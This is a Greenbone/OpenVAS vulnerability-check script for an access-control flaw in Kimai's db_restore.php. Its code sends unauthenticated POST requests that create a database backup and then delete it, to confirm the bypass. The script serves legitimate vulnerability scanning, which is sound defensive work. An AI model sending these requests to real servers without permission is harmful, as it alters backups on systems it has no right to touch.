if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903512" );
	script_version( "2021-08-04T10:08:11+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-04 10:08:11 +0000 (Wed, 04 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-02-25 11:03:19 +0530 (Tue, 25 Feb 2014)" );
	script_name( "Kimai 'db_restore.php'Security Bypass Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with kimai and is prone to security bypass
  vulnerability" );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP POST request and check whether it
  is possible to bypass security restrictions." );
	script_tag( name: "insight", value: "The flaw is due to an improper restricting access to 'db_restore.php' script" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to conduct certain backup
  and restore operations." );
	script_tag( name: "affected", value: "Kimai version 0.9.2.1306 and prior." );
	script_tag( name: "solution", value: "Upgrade to Kimai version 0.9.3 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/53390" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/84389" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/30010" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.kimai.org/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
kimPort = http_get_port( default: 80 );
if(!http_can_host_php( port: kimPort )){
	exit( 0 );
}
host = http_host_name( port: kimPort );
for dir in nasl_make_list_unique( "/", "/kimai", http_cgi_dirs( port: kimPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: kimPort );
	if(ContainsString( rcvRes, "Kimai Login<" ) && ContainsString( rcvRes, "kimaiusername" )){
		postdata = "submit=create+backup";
		sndReq = NASLString( "POST ", dir, "/db_restore.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n\\r\\n", postdata );
		rcvRes = http_keepalive_send_recv( port: kimPort, data: sndReq );
		backId = eregmatch( pattern: "name=.dates.*value=.([0-9]+).", string: rcvRes );
		if(backId[1]){
			postdata = "dates%5B%5D=" + backId[1] + "&submit=delete";
			sndReq = NASLString( "POST ", dir, "/db_restore.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n\\r\\n", postdata );
			rcvRes = http_keepalive_send_recv( port: kimPort, data: sndReq );
			if(!ContainsString( rcvRes, backId[1] ) && ContainsString( rcvRes, "create backup" ) && ContainsString( rcvRes, "!-- delete -->" )){
				security_message( port: kimPort );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

